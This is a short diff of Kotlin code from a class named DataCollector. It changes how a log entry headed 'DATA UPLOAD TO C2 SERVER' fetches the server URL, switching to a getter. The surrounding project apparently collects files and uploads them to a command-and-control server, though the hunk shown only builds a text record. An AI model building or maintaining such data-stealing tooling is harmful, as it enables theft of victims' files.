@@ -121,7 +121,7 @@ class DataCollector {
                         content.append("DATA UPLOAD TO C2 SERVER\n")
                         content.append("Timestamp: ${Date()}\n")
                         content.append("Data type: $dataType\n")
-                        content.append("C2 Server: ${C2Config.SERVER_URL}\n")
+                        content.append("C2 Server: ${C2Config.getServerUrl()}\n")
                         content.append("Files included:\n")
                         
                         files.forEach { file ->
